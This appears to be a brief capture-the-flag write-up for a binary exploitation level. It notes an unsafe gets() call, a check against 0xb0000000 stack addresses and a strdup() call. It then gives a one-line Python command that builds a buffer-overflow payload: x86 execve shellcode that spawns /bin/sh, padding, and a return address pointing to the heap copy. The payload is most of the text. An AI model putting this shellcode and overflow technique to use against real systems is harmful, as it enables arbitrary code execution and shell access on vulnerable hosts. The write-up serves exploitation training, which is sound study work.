# Level2

When we take a look at the [decom](./level2_decomp.c), we notice the use of `gets()` a line to check if an address is located in the `0xb0000000` range.
We can also see a call to `strdup()`.

```bash
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a"*59 + "\x08\xa0\x04\x08"' > /var/crash/tmp.txt
```

